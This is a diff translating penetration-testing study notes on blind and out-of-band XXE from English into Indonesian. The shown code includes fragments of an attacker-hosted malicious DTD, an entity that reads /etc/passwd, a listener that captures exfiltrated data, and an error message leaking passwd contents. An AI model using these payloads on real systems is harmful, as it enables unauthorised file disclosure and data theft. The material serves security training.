@@ -3,26 +3,26 @@
 Status:
 
 Tags: [[eWPTX]] [[XML]]
-###### Prerequisites: [[XML External Entities (XXE)]]
+###### Prasyarat: [[XML External Entities (XXE)]]
 # Blind & OOB XXE
 
-## Overview
+## Gambaran singkat
 
-In blind XXE, the server processes the XXE payload but doesn't reflect the entity value in the response. You need out-of-band (OOB) channels to exfiltrate data.
+Di blind XXE, server memproses payload XXE tapi tidak memantulkan nilai entity ke response. Jadi kamu butuh channel out-of-band (OOB) untuk exfiltrate data.
 
 ---
 
-## When to Use Blind XXE
+## Kapan memakai blind XXE
 
-- Application parses XML but doesn't display entity values
-- Error messages are suppressed
-- Response is a fixed status code (200 OK) regardless of content
+- Aplikasi mem-parse XML tapi tidak menampilkan nilai entity
+- Error message disembunyikan
+- Response cenderung “flat” (mis. selalu 200 OK) apa pun isi request
 
 ---
 
 ## OOB Exfiltration via Parameter Entities
 
-### Step 1: Host a malicious DTD on your server
+### Langkah 1: Host DTD berbahaya di server kamu
 
 Create `evil.dtd` on attacker server:
 
@@ -33,7 +33,7 @@ Create `evil.dtd` on attacker server:
 %exfil;
 ```
 
-### Step 2: Send the XXE payload
+### Langkah 2: Kirim payload XXE
 
 ```xml
 <?xml version="1.0"?>
@@ -44,7 +44,7 @@ Create `evil.dtd` on attacker server:
 <foo>bar</foo>
 ```
 
-### Step 3: Capture data on your server
+### Langkah 3: Tangkap data di server kamu
 
 ```bash
 # Start a listener
@@ -54,13 +54,13 @@ python3 -m http.server 8000
 # GET /?data=web-server-01 HTTP/1.1
 ```
 
-The file content arrives as a query parameter in the HTTP request.
+Isi file akan “datang” sebagai query parameter di request HTTP.
 
 ---
 
-## DNS-Based Detection
+## Deteksi berbasis DNS
 
-Simplest way to confirm blind XXE — no data exfiltration, just confirming the vulnerability exists:
+Cara paling sederhana untuk memastikan blind XXE — tanpa exfil data, hanya konfirmasi vulnerabilitasnya ada:
 
 ```xml
 <?xml version="1.0"?>
@@ -70,15 +70,15 @@ Simplest way to confirm blind XXE — no data exfiltration, just confirming the 
 <foo>&xxe;</foo>
 ```
 
-Use Burp Collaborator or interactsh to detect the DNS lookup.
+Gunakan Burp Collaborator atau interactsh untuk mendeteksi DNS lookup/callback.
 
 ---
 
-## Error-Based XXE
+## Error-based XXE
 
-Force the parser to include file contents in error messages:
+Memaksa parser “membocorkan” isi file lewat error message:
 
-### Step 1: Host error DTD
+### Langkah 1: Host error DTD
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -87,7 +87,7 @@ Force the parser to include file contents in error messages:
 %error;
 ```
 
-### Step 2: Send payload
+### Langkah 2: Kirim payload
 
 ```xml
 <?xml version="1.0"?>
@@ -106,9 +106,9 @@ java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash...
 
 ---
 
-## Blind XXE via Local DTD
+## Blind XXE via local DTD
 
-When the server blocks outbound connections, reuse a local DTD file already on the server:
+Saat server memblokir koneksi outbound, kamu bisa memanfaatkan DTD lokal yang sudah ada di server:
 
 ```xml
 <?xml version="1.0"?>
@@ -132,9 +132,9 @@ Common local DTDs to try:
 
 ---
 
-## CDATA Exfiltration for XML-Breaking Characters
+## CDATA exfiltration untuk karakter yang memecahkan XML
 
-When the file contains `<`, `>`, `&` that break the XML syntax:
+Saat file mengandung `<`, `>`, `&` yang bisa memecahkan sintaks XML:
 
 ```xml
 <!-- evil.dtd -->
@@ -162,11 +162,11 @@ If the PHP `expect` extension is loaded:
 
 ---
 
-## Testing Checklist
+## Checklist pengujian
 
-1. Test basic entity expansion (non-blind confirmation)
-2. Test DNS callback to confirm blind XXE
-3. Try OOB HTTP exfiltration with external DTD
-4. If outbound HTTP is blocked, try error-based extraction
-5. If external connections are blocked entirely, try local DTD technique
-6. Test for PHP wrappers if PHP is suspected
+1. Test entity expansion dasar (konfirmasi non-blind)
+2. Test DNS callback untuk konfirmasi blind XXE
+3. Coba OOB HTTP exfiltration via external DTD
+4. Jika outbound HTTP diblok, coba error-based extraction
+5. Jika koneksi eksternal diblok total, coba teknik local DTD
+6. Jika target PHP, cek kemungkinan wrapper PHP
